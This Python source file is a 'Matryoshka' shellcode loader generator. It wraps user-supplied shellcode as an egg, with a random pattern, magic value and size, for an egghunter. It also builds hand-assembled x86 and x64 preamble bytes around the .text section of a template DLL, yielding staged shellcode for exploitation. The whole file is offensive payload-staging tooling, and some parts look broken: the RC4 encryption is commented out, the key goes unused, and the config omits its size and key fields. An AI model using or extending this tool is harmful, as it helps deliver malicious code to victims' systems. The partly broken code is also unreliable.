#!/usr/bin/env python3

import argparse
import os
import pefile
import struct
import sys

from Crypto.Cipher import ARC4

class Config:
	MAGIC = 0xC0FFEE

	@classmethod
	def Generate(cls, size, pattern, key):
		magic = struct.pack('I', cls.MAGIC)
		size = struct.pack('I', size)
		config = bytearray(magic) + pattern 
		
		return config

class Egg:
	MAGIC = 0xFEEDFACE

	def __init__(self, payload):
		self.key = os.urandom(16)
		self.pattern = os.urandom(8)
		self.payload = payload

	def Generate(self):
		#cipher = ARC4.new(key)
		#msg = cipher.encrypt(payload)
		magic = bytearray(struct.pack('I', self.MAGIC))
		size = struct.pack('I', len(self.payload))
		
		return self.pattern +  magic + size + self.payload
												
	def GetKey(self):
		return self.key

	def GetPattern(self):
		return self.pattern

class Template:

	def __init__(self, path):
		self.pe = pefile.PE(path)

		for section in self.pe.sections:
			if section.Name.decode('ascii').rstrip('\x00') == '.text':
				self.section = section

		if not hasattr(self, 'section'):
			raise RuntimeError("Failed to find the .text section in the template PE")

	def GetOffset(self):
		entrypoint = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
		offset = entrypoint - self.section.VirtualAddress
		return offset

	def GetShellcode(self):
		return self.section.get_data()

class Preamble:

	@staticmethod
	def GenerateX86(entrypoint):
		preamble_size = 28
		config_size = 12
		offset = entrypoint + preamble_size + config_size

		preamble  = b'\xE8' + b'\x00\x00\x00\x00'      # CALL 0
		preamble += b'\x58'			       # POP EAX
		preamble += b'\x83\xE8\x05'		       # SUB EAX, 5
		preamble += b'\x53'			       # PUSH EBX
		preamble += b'\x8B\xD8'		      	       # MOV EBX, EAX
		preamble += b'\x05' + struct.pack('I', offset) # ADD EAX, $OFFSET
		preamble += b'\x83\xC3\x1C'                    # ADD EBX, 1C
		preamble += b'\x53'			       # PUSH EBX (EBX = Pointer to Config)
		preamble += b'\xFF\xD0'			       # CALL EAX
		preamble += b'\x83\xC4\x04'		       # ADD ESP, 4
		preamble += b'\x5B'			       # POP EBX
		preamble += b'\xC3'			       # RETN

		return preamble

	@staticmethod
	def GenerateX64(entrypoint):
		preamble_size = 44
		config_size = 12
		offset_loader = entrypoint + preamble_size + config_size
		offset_config = preamble_size

		preamble  = b'\x48\x8d\x05\x00\x00\x00\x00'                   # LEA RAX, [RIP+0x0] 
		preamble += b'\x48\x83\xE8\x07'                               # SUB RAX, 7
		preamble += b'\x51'			                      # PUSH RCX
		preamble += b'\x48\x8B\xC8'	      	                      # MOV RCX, RAX
		preamble += b'\x48\x05'	+ struct.pack('I', offset_loader)     # ADD RAX, $OFFSET_LOADER
		preamble += b'\x48\x81\xC1' + struct.pack('I', offset_config) # ADD RCX, $OFFSET_CONFIG
		preamble += b'\x56'			                      # PUSH RSI
		preamble += b'\x48\x8B\xF4'		                      # MOV RSI, RSP
		preamble += b'\x48\x83\xEC\x20'		                      # SUB RSP, 20
		preamble += b'\xFF\xD0'			                      # CALL RAX
		preamble += b'\x48\x89\xF4'		                      # MOV RSP, RSI
		preamble += b'\x5E'			                      # POP RSI
		preamble += b'\x59'			                      # POP RCX
		preamble += b'\xC3'			                      # RET

		return preamble

class Matryoshka:

	@staticmethod
	def Generate(payload, architecture):
		if architecture.lower() == 'x86':
			return Matryoshka.GenerateX86(payload)
		elif architecture.lower() == 'x86_64':
			return Matryoshka.GenerateX64(payload)
		else:
			print("[-] Error must specify either x86 or x86_64 as the architecture")
			sys.exit(-1)

	@staticmethod
	def GenerateX86(payload):
		print("[i] Opening the x64 shellcode template file") 
		template = Template("templates/x86/Matryoshka.dll")

		offset = template.GetOffset()
		print("[i] Discovered entrypoint at offset: " + hex(offset))
		
		shellcode = template.GetShellcode()
		egg = Egg(payload)

		print("[+] Generated the bootstrap preamble for the egghunter")
		preamble = Preamble.GenerateX86(offset)

		print("[i] Generating the egghunter configuration file")
		config = Config.Generate(
					len(payload),
					egg.GetPattern(),
					egg.GetKey()
				)
		
		print("[i] Combining the generated config, preamble, and loader")
		return preamble + config + template.GetShellcode(), egg.Generate()
		
	@staticmethod
	def GenerateX64(payload):
		print("[i] Opening the x64 shellcode template file") 
		template = Template("templates/x64/Matryoshka.dll")
		offset = template.GetOffset()
		shellcode = template.GetShellcode()

		print("[+] Generated the bootstrap preamble for the egghunter")
		preamble = Preamble.GenerateX64(offset)

		egg = Egg(payload)

		print("[i] Generating the egghunter configuration file")
		config = Config.Generate(
					len(payload),
					egg.GetPattern(),
					egg.GetKey()
				)		

		print("[i] Combining the generated config, preamble, and loader")
		return preamble + config + template.GetShellcode(), egg.Generate()

def main():
	parser = argparse.ArgumentParser(
		description='Matryoshka Loader Shellcode Generator', add_help=True
	)
	parser.add_argument(
		'-s', '--shellcode', help="Path to shellcode file", required=True
	)
	parser.add_argument(
		'-a', '--architecture', help="Payload architecture to target (x86 or x86_64)", required=True
	)
	parser.add_argument(
		'-o', '--output-shellcode', help="Path to write Matryoshka shellcode to", required=True
	)
	parser.add_argument(
		'-e', '--output-egg', help="Path to write Egg value to", required=True
	)
	
	args = parser.parse_args()
	
	with open(args.shellcode, 'rb') as shellcode:
		print("[+] Opening the shellcode file specified by the user")
		payload = shellcode.read()
		result = Matryoshka.Generate(payload, args.architecture)
		matryoshka = result[0]
		egg = result[1]
			
	print("[i] Writing the generated egghunter shellcode to disk")
	with open(args.output_shellcode, 'wb+') as file:
		file.write(matryoshka)
			
	print("[i] Writing the generated egg to disk")
	with open(args.output_egg, 'wb+') as file:
		file.write(egg)
			
if __name__ == "__main__":
	main()
